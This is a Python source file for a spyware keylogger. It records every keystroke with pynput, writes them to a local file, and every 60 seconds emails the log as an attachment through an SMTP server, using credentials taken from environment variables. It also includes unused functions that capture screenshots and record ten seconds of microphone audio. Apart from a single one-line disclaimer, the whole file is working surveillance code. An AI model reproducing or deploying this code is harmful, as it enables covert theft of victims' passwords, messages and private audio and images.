import os
import logging
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from dotenv import load_dotenv

# Load environment variables from a .env file
load_dotenv()

EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
SEND_REPORT_EVERY = 60  # in seconds

# Ensure credentials are provided
if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
    raise ValueError("Please set EMAIL_ADDRESS and EMAIL_PASSWORD in your environment variables.")

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password
        self.log_file = "keylog.txt"

    def append_log(self, string):
        self.log += string

    def save_log_to_file(self):
        with open(self.log_file, "w") as file:
            file.write(self.log)

    def send_mail(self, subject, body, attachments=None):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email  # Send to yourself
            msg['Subject'] = subject

            msg.attach(MIMEText(body, 'plain'))

            # Attach files if provided
            if attachments:
                for file_path in attachments:
                    with open(file_path, "rb") as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
                        msg.attach(part)

            # Send email
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(self.email, self.password)
                server.send_message(msg)
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def report(self):
        self.save_log_to_file()
        self.send_mail(
            subject="KeyLogger Report",
            body="Find the attached log file.",
            attachments=[self.log_file]
        )
        self.log = ""  # Clear log after sending
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def save_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "[SPACE]"
            elif key == key.esc:
                current_key = "[ESC]"
            else:
                current_key = f"[{key}]"
        self.append_log(current_key + " ")

    def capture_screenshot(self):
        try:
            screenshot_path = "screenshot.png"
            img = pyscreenshot.grab()
            img.save(screenshot_path)
            return screenshot_path
        except Exception as e:
            logging.error(f"Failed to capture screenshot: {e}")
            return None

    def record_microphone(self):
        try:
            audio_path = "recording.wav"
            fs = 44100
            seconds = 10  # Record for 10 seconds
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            with wave.open(audio_path, 'w') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(recording.tobytes())
            return audio_path
        except Exception as e:
            logging.error(f"Failed to record audio: {e}")
            return None

    def run(self):
        logging.info("KeyLogger is running...")
        keyboard_listener = keyboard.Listener(on_press=self.save_key)
        with keyboard_listener:
            self.report()  # Start the reporting thread
            keyboard_listener.join()

# Disclaimer: Use this script only on devices you own or have explicit permission to monitor.
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
